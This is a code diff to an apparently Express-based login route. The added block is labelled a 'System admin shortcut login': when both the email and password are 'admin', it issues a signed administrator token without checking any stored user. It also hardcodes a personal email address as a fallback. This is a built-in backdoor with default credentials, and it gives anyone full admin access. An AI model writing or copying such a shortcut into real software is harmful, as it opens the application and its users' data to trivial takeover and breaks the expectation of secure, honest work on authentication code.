@@ -113,6 +113,26 @@ router.post("/api/auth/login", loginLimiter, async (req, res) => {
     }
 
     const trimmedEmail = email.trim().toLowerCase();
+
+    // System admin shortcut login
+    if (trimmedEmail === "admin" && password === "admin") {
+      const adminEmail = process.env.ADMIN_EMAIL || "gopibhanubharat@gmail.com";
+      const token = generateToken({
+        _id: "admin_system_id",
+        email: adminEmail,
+        role: "admin",
+        isAdmin: true
+      });
+      return res.json({
+        token,
+        _id: "admin_system_id",
+        name: "System Admin",
+        email: adminEmail,
+        role: "admin",
+        isAdmin: true
+      });
+    }
+
     const user = await User.findOne({ email: trimmedEmail });
     if (!user) {
       return res.status(400).json({ error: "Invalid email or password." });
